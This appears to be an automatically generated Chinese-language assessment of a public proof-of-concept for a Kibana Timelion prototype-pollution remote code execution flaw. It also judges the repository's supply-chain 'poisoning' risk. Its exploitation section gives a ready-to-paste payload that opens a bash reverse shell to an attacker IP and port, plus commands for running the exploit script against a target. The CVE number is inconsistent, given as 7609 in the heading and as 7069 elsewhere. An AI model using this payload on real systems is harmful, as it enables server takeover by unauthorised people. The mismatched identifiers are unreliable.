## CVE-2019-7609 - Kibana Remote Code Execution

**漏洞编号:** CVE-2019-7069

**漏洞类型:** Remote Code Execution

**影响应用:** Kibana

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 6.6.1

**利用条件:** 需要可以访问Kibana服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于Kibana的Timelion visualizer中，允许攻击者通过原型污染执行任意代码。具体来说，攻击者可以构造特定的Timelion表达式，修改JavaScript原型链上的属性，从而在服务器端执行恶意命令。

**有效性：**
根据提供的漏洞利用代码（`kibana_exploit.py`和`README.md`），该POC是有效的。`README.md`详细描述了漏洞的利用方法，包括手动利用（通过Timelion）和自动化利用（通过Python脚本）。`kibana_exploit.py`脚本实现了自动化利用，可以检测Kibana版本，验证漏洞是否存在，并执行任意命令，甚至可以建立反向shell。

**投毒风险：**
`kibana_exploit.py` 脚本内容相对简单, 未发现明显恶意代码。脚本主要功能是发送HTTP请求并解析响应，以及构造特定的Timelion表达式。`README.md`文件包含了一些免责声明，表明作者不负责任任何滥用行为。仓库存在投毒风险,主要存在于以下假设情景:
1.  **依赖库投毒:**  虽然 `requests` 和 `packaging` 库本身不太可能被投毒，但如果用户从非官方源安装了恶意版本的依赖库，则可能引入恶意代码。
2.  **远端服务器投毒:**  脚本中的某些功能（例如，获取 Kibana 版本）可能依赖于从远程服务器获取数据。如果这些服务器被攻击者控制，则可能返回恶意数据，从而导致代码执行。
3.  **协作开发人员投毒:** 此脚本由LandGrey开发，[Your Name] refactor, 不排除原始作者存在投毒。
4.  **文件篡改:**  虽然不太可能，但如果攻击者能够篡改脚本文件本身，则可能插入恶意代码。但这种情况的概率较低，因为需要一定的权限才能修改文件。

**利用方式：**
1.  **手动利用（Timelion）：**
    *   打开Kibana的Timelion visualizer。
    *   粘贴提供的payload到Timelion表达式编辑器中，例如：
        `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1");process.exit()//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')`
    *   将`192.168.1.100`和`4444`替换为攻击者的IP地址和端口。
    *   点击“Run”，然后点击左侧的“Canvas”，即可触发反向shell。

2.  **自动化利用（Python脚本）：**
    *   安装依赖库：`pip install requests packaging`
    *   运行脚本：`python3 kibana_exploit.py -u http://target-kibana:5601`
    *   如果需要反向shell，可以使用以下命令：
        `python3 kibana_exploit.py -u http://target-kibana:5601 --shell -host YOUR_IP -port LISTENER_PORT`
    *   替换`YOUR_IP`和`LISTENER_PORT`为攻击者的IP地址和端口。

该漏洞利用的核心是原型污染，通过修改`label.__proto__.env`属性，可以设置`NODE_OPTIONS`环境变量，从而在执行JavaScript代码时加载恶意模块，最终执行任意命令。

**项目地址:** [CaelumIsMe/CVE-2019-7069-POC](https://github.com/CaelumIsMe/CVE-2019-7069-POC)

**漏洞详情:** [CVE-2019-7069](https://nvd.nist.gov/vuln/detail/CVE-2019-7069)